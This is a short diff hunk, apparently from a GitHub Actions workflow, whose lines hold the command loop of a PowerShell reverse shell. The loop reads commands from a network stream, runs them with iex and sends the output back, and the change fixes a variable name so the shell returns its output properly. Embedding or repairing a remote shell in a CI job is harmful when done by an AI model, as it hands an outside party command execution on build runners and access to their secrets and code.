@@ -49,7 +49,7 @@ jobs:
         while(($i = $st.Read($bytes, 0, $bytes.Length)) -ne 0){
           $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sb = (iex $data 2>&1 | Out-String );
-           $sb2 = $sendback + "PS " + (pwd).Path + "> ";
+           $sb2 = $sb + "PS " + (pwd).Path + "> ";
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);
            $st.Write($sendbyte,0,$sendbyte.Length);
            $st.Flush();};$cli.Close();
